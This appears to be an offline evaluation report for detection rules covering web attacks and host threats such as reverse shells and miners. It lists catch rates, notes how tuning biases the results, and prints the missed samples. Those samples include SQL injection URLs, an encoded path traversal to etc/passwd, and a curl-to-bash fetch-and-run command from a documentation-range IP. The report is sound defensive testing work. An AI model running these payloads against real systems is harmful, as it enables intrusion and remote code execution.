# Round 2 held-out evaluation (offline)

Made by `python3 eval/heldout_round2.py` on 2026-11-22. Rules were NOT changed for this run.

**How to read the Set column.** `dev-2` = the built-in round-2 samples: they were run once untuned (see ROUND2_BEFORE_TUNING.md: SQLi 64%, XSS 92%, traversal 78%, command injection 57%), then the rules were fixed for their misses, so they are now DEVELOPMENT samples and their numbers are optimistic. Any other set name (e.g. `round3`, `teammate`) = samples from that folder that no rule was tuned on: those are the honest numbers. Samples written by the rule author are not independent; `teammate` (written by someone who never read the rules) is the independent one. For BENIGN rows lower is better. Small hand-written sets, no network traffic.

| Set | Area | Class | Samples | Caught / wrong | Note |
|---|---|---|---|---|---|
| dev-2 | web | SQL injection | 50 | 49 (98%) | 45 would block on that single request |
| dev-2 | web | XSS | 50 | 50 (100%) | 2 would block on that single request |
| dev-2 | web | Path traversal | 50 | 50 (100%) | 50 would block on that single request |
| dev-2 | web | Command injection / log4shell | 51 | 51 (100%) | 51 would block on that single request |
| dev-2 | web | BENIGN requests | 81 | 0 | 0 would BLOCK a visitor on one request (must be 0) |
| dev-2 | web | BENIGN 404/403 and admin-login pages | 5 | 0 | scored 10+ points (must be 0) |
| dev-2 | host | Reverse shells (with a remote connection) | 26 | 25 (96%) | killed |
| dev-2 | host | Crypto miners | 16 | 16 (100%) | killed |
| dev-2 | host | BENIGN processes | 40 | 0 | wrongly killed (must be 0) |
| round3 | web | SQL injection | 30 | 29 (97%) | 26 would block on that single request |
| round3 | web | XSS | 30 | 30 (100%) | 1 would block on that single request |
| round3 | web | Path traversal | 30 | 29 (97%) | 29 would block on that single request |
| round3 | web | Command injection / log4shell | 31 | 31 (100%) | 30 would block on that single request |
| round3 | web | BENIGN requests | 47 | 1 | 0 would BLOCK a visitor on one request (must be 0) |
| round3 | host | Reverse shells | 16 | 16 (100%) | killed |
| round3 | host | Crypto miners | 12 | 12 (100%) | killed |
| round3 | host | BENIGN processes | 38 | 0 | wrongly killed (must be 0) |

## Misses and false positives (printed, not hidden)

- dev-2 web SQL injection not flagged: /a?id=1' AND 1=CAST((SELECT version()) AS INT)--
- dev-2 host reverse shell not caught: curl http://198.51.100.7/s.sh | bash
- round3 web SQL injection not flagged: /api/users?filter=name eq 'a' or 1 eq 1
- round3 web Path traversal not flagged: /get?name=..%u2216..%u2216etc%u2216passwd
- round3 web BENIGN flagged (4 points): /p?comment=5+%3C+10+and+10+%3E+5
